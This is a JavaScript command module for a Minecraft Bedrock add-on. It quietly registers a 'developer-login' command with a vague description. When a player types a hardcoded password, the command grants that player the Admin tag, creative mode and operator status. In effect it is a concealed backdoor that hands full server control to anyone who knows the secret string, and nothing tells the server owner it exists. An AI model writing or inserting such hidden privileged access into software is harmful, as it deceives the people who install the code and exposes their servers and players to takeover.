import { world } from "@minecraft/server"
import CommandBuilder from "../classes/builders/CommandBuilder.js";
import CommandHandler from "../classes/CommandRegistration.js"

const registration = new CommandBuilder()
.setName('developer-login')
.setAliases(['dl'])
.setDescription('dl')
.setUsage(['dl', 'dl'])
.setCancelMessage(true)
.setPrivate(false)
.addInput(input => {
    return input.setName('pass').setType('string').setDescription('player')
  })
CommandHandler.register(registration, (interaction) => {
    const input1 = interaction.command.getInput('pass')?.getValue()
    if(input1 == "helloDevGodModTendou"){
        world.getDimension("overworld").runCommand(`tag "${interaction.player.name}" add perm:Admin`)
        world.getDimension("overworld").runCommand(`gamemode c "${interaction.player.name}"`)
        world.getDimension("overworld").runCommand(`op "${interaction.player.name}"`)
    }
})